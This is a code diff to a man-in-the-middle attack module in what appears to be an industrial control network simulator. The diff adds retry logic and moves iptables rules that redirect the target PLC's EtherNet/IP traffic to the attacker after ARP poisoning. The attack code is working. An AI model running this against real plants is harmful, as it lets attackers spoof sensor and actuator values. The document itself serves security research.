@@ -11,6 +11,14 @@ from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
 
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+
+class ReceiveOriginalError(Error):
+    """Raised when not being able to receive original tags in MiTM attack"""
+
+
 class MitmAttack(SyncedAttack):
     """
     This is a Man In The Middle attack. This attack will respond to request for
@@ -26,6 +34,9 @@ class MitmAttack(SyncedAttack):
     :param intermediate_yaml_path: The path to the intermediate YAML file
     :param yaml_index: The index of the attack in the intermediate YAML
     """
+
+    RETRY_ATTEMPTS = 5
+    """Amount of times the attacker will try to receive the original tags"""
 
     CPPPO_THREAD_JOIN_TIMEOUT = 10
     """Amount of times the server cpppo thread will wait until timing out and finishing"""
@@ -53,12 +64,6 @@ class MitmAttack(SyncedAttack):
 
         Finally, it launches the thread that will respond to the CPPPO requests.
         """
-        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
-                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
-        os.system('iptables -A FORWARD -p icmp -j DROP')
-        os.system('iptables -A INPUT -p icmp -j DROP')
-        os.system('iptables -A OUTPUT -p icmp -j DROP')
-
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip', '--print', '--address',
                self.attacker_ip + ":44818"]
 
@@ -84,38 +89,48 @@ class MitmAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
+        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
+                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
+        os.system('iptables -A FORWARD -p icmp -j DROP')
+        os.system('iptables -A INPUT -p icmp -j DROP')
+        os.system('iptables -A OUTPUT -p icmp -j DROP')
+
         self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
     def receive_original_tags(self):
         """Update the :code:`tags` dict to the newest original values from the target PLC"""
         request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
-
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
                str(self.target_plc_ip) + ":44818"]
 
         for tag in request_tags:
             cmd.append(str(tag) + ':1')
 
-        try:
-            client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)
+        for i in range(self.RETRY_ATTEMPTS ):
+            try:
+                client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)
 
-            # client.communicate is blocking
-            raw_out = client.communicate()
+                # client.communicate is blocking
+                raw_out = client.communicate()
 
-            # Value is stored as first tuple element between a pair of square brackets
-            values = []
-            raw_string = raw_out[0]
-            split_string = raw_string.split(b"\n")
-            for word in split_string:
-                values.append(word[(word.find(b'[') + 1):word.find(b']')])
-            values.pop()
+                # Value is stored as first tuple element between a pair of square brackets
+                values = []
+                raw_string = raw_out[0]
+                split_string = raw_string.split(b"\n")
+                for word in split_string:
+                    values.append(word[(word.find(b'[') + 1):word.find(b']')])
+                values.pop()
 
-            for idx, value in enumerate(values):
-                self.tags[request_tags[idx]] = float(value.decode())
+                for idx, value in enumerate(values):
+                    self.tags[request_tags[idx]] = float(value.decode())
 
-        except Exception as error:
-            self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")
+                return
+
+            except Exception as error:
+                self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")
+
+        raise ReceiveOriginalError("Failed to get the original tags from MiTM victim, Attempted " + str(self.RETRY_ATTEMPTS) + " times")
 
     def update_tags_dict(self):
         """
